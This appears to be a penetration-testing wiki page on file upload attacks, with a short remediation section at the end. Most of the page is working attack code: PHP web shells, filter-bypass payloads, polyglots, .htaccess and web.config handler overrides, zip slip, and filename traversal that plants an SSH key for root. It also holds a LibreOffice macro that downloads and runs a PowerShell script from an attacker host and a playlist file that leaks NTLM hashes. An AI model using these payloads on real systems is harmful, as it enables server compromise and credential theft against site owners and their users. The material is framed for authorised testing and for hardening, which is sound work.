# File Upload Attacks

If you can upload a file the server will execute, you have RCE. The goal is to understand and test the validation between you and a web shell; when execution is locked down, assess whether the upload enables path traversal, hash capture, or a client-side payload instead. During web assessments, test every in-scope upload endpoint found during [Web Enumeration](web-enumeration.md), including avatars, document uploads, import features, and file managers.

{% hint style="warning" %}
A shell that returns `id` proves execution. It does **not** finish the job. For the report, escalate to an interactive reverse shell as the web user, then show what it reaches (config secrets, other users, SSH). And loot `wp-config.php` / `.env` before you even drop a shell — reused DB creds open more doors than a webshell does.
{% endhint %}

## Minimal PHP web shells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $o); echo implode("\n",$o); ?>
```

Then browse `shell.php?cmd=id`. When `system`/`exec`/`shell_exec`/`passthru`/`proc_open` are all disabled via `disable_functions`, `popen()` usually survives:

```php
<?php $h=popen($_GET["cmd"],"r"); while(!feof($h)){echo fread($h,4096);} pclose($h); ?>
```

## Bypass client-side validation

The check is in JavaScript and trivially skipped. Upload the file, intercept in Burp, and change the filename/`Content-Type`/content after the browser's check has passed. Or disable the check in DevTools:

```javascript
document.querySelector('input[type="file"]').accept = '';
```

## Extension bypass

Servers that blacklist `.php` often miss its relatives or mishandle multiple/odd-cased extensions.

### Double extensions

```
shell.php.jpg      # some configs run the .php part
shell.jpg.php      # try both orders
shell.php.png
```

### Alternative executable extensions

```
.php5  .php7  .phtml  .phar  .pht  .phps  .phpt   # PHP variants
.pgif  .pjpeg                                     # odd handler maps
```

### Case manipulation

```
shell.PHP   shell.PhP   shell.pHp   SHELL.PHP
```

### Null byte (old PHP < 5.3)

```
shell.php%00.jpg
shell.php\x00.gif
```

## Content-Type and magic-byte bypass

Change the multipart `Content-Type` to an image type, and prepend real image magic bytes so a signature/`getimagesize()` check passes:

```
GIF89a;<?php system($_GET['cmd']); ?>              # GIF signature
FF D8 FF E0 ...<?php system($_GET['cmd']); ?>      # JPEG signature
89 50 4E 47 ...<?php system($_GET['cmd']); ?>      # PNG signature
```

In Burp, the request looks like:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

GIF89a;
<?php system($_GET['cmd']); ?>
------X--
```

### Polyglots

A file valid as both an image and a script slips past strict validators:

```bash
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>' > shell.php
cat real.jpg shell.php > polyglot.php   # prepend a full JPEG header
```

## Config-file uploads — make the server execute your file

When the extension is locked but `.htaccess`/`web.config` aren't blacklisted, upload a config that changes how a permitted extension is handled.

### Apache `.htaccess`

```apache
# Upload this .htaccess, then upload shell.png (or shell.php.png)
AddType application/x-httpd-php .png
```

```bash
curl "http://<TARGET>/uploads/shell.php.png?cmd=whoami"
```

### IIS `web.config`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.txt" verb="*" modules="FastCgiModule"
           scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Either" />
    </handlers>
  </system.webServer>
</configuration>
```

## Other primitives

**Archive extraction (zip slip).** If the server unpacks uploads, ship path traversal inside the archive to write outside the upload dir:

```bash
zip -r exploit.zip ../../../var/www/html/shell.php
tar czf exploit.tar.gz ../../../var/www/html/shell.php
```

**Race condition.** Upload and request the file in a tight loop before a scanner deletes it:

```bash
while true; do
  curl -F "file=@shell.php" http://<TARGET>/upload.php
  curl "http://<TARGET>/uploads/shell.php?cmd=id"
done
```

## Filename traversal → SSH `authorized_keys` (no execution needed)

If the app writes the file using the client-supplied `filename=` without stripping `../`, traverse out of the upload dir and drop your public key straight into a user's `~/.ssh/authorized_keys`.

```bash
# 1. Generate a keypair on <ATTACKER_IP>
ssh-keygen -t ed25519 -f id_pwn -N ''
```

```
# 2. In Burp, replay a normal upload and change ONLY the filename:
Content-Disposition: form-data; name="file"; filename="../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... pwn
```

```bash
# 3. SSH in
chmod 600 id_pwn
ssh -i id_pwn root@<TARGET>
```

Targets to try in order (needs an existing `.ssh/` and web-user write access there):

```
../../../../root/.ssh/authorized_keys
../../../../home/<user>/.ssh/authorized_keys
../../../../home/git/.ssh/authorized_keys
../../../../var/lib/postgresql/.ssh/authorized_keys
```

## Media / document uploads → hash capture & client-side RCE

When the box "reviews" or plays back what you upload, weaponize the file for the reviewer.

**Windows media playlist → NTLM leak.** A `.wax`/`.asx` pointing at a UNC path forces the player to authenticate to your listener:

```bash
cat > leak.wax << 'EOF'
<asx version="3.0"><entry><title>x</title><ref href="file://<ATTACKER_IP>/share/leak.wma"/></entry></asx>
EOF
sudo responder -I tun0 -A     # upload leak.wax -> NetNTLMv2 lands -> crack with hashcat -m 5600
```

**LibreOffice macro document.** A doc a bot or admin opens runs your macro (Tools -> Macros -> Basic):

```basic
Sub Main
    Shell("cmd /c powershell -c ""IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/shell.ps1')""")
End Sub
```

Save as `shell.odt`, bind it to the Open Document event, and verify the macro is embedded (not just in your local profile):

```bash
unzip -l shell.odt | grep -i basic   # expect Basic/Standard/Module1.xml
```

## Web file managers & other write channels

**Tiny File Manager default creds.** A single-PHP-file browser that ships with `admin:admin@123` (and read-only `user:12345`). Log in, browse to a writable web path, upload a shell, set it 755, run it. If defaults fail, fetch the world-readable PHP file to read configured creds.

**WebDAV.** Misconfigured WebDAV lets you `PUT` a webshell directly:

```bash
nmap -sV -p 80 --script=http-enum <TARGET>
davtest -auth <USER>:<PASS> -url http://<TARGET>/webdav
cadaver http://<TARGET>/webdav        # then: put /usr/share/webshells/asp/webshell.asp
```

**FTP into the webroot.** Compromised FTP creds where the FTP user owns the docroot = instant RCE. vsftpd often uploads at mode `600` (unreadable by www-data) — fix with `SITE CHMOD`:

```
ftp <TARGET>
> cd /var/www/html
> put sh.php
> quote SITE CHMOD 644 sh.php
> quit
curl "http://<TARGET>/sh.php?c=id"
```

Grab `wp-config.php` / `.env` through any of these before dropping a shell — reused DB creds beat a webshell.

## Common upload locations to check for your shell

```
/uploads/  /files/  /media/  /documents/  /attachments/
/assets/images/  /public/  /wp-content/uploads/  /var/www/html/
```

## Testing methodology

```bash
# 1. Upload a benign file - note the stored path and filename handling
echo "test" > test.txt

# 2. Try a straight PHP shell; if blocked, cycle extension variants
for ext in php php5 php7 phtml phar pht; do cp shell.php shell.$ext; done

# 3. Content-Type check?  set image/png in Burp + prepend GIF89a / JPEG magic bytes
# 4. Extension locked?    upload .htaccess (AddType) or web.config, then shell.png
# 5. No execution at all? pivot: filename traversal to authorized_keys, or a media/doc payload for the reviewer
# 6. Access the shell, upgrade to a reverse shell, loot config first
curl "http://<TARGET>/uploads/shell.php?cmd=id"
```

## Prove impact, don't stop at `?cmd=id`

For the [report](report-writing.md), show the real consequence: an interactive reverse shell as the web user, config/DB credentials you looted and reused, an SSH key you dropped and logged in with, or a captured NTLM hash you cracked. The `id` output proves execution; the foothold and what it reaches prove the finding and drive the severity.

## Fix guidance (for the remediation section)

* **Validate server-side by content, not extension.** Check real magic bytes/MIME, and enforce an allowlist of extensions — never a blacklist.
* **Rename on upload** to a random server-generated name, and never trust the client `filename=` (strip path separators; use `secure_filename()`-style helpers).
* **Store uploads outside the web root**, or disable script execution in the upload dir (`php_flag engine off`, `RemoveHandler`, Nginx `location /uploads { deny all; }`).
* **Reject config-file names** (`.htaccess`, `web.config`) and archives you'll auto-extract; canonicalize any extraction paths to block zip slip.
* **Least privilege**: the web user can't write to other users' home dirs or reach `sudo`, blunting the traversal-to-SSH chain.

## Related

* [Web Enumeration](web-enumeration.md) — find every upload endpoint first
* [HTTP Attacks](http-attacks.md) · [SQL Injection](sql-injection.md) · [Command Injection](command-injection.md) · [File Inclusion](file-inclusion.md)
* [Cross-Site Scripting](xss.md) — when an uploaded SVG/HTML runs script instead of shell code
* [Server-Side Attacks](server-side-attacks.md) — deserialization and SSRF that pair with upload primitives
* [Report Writing](report-writing.md) — turning an uploaded shell into a rated finding
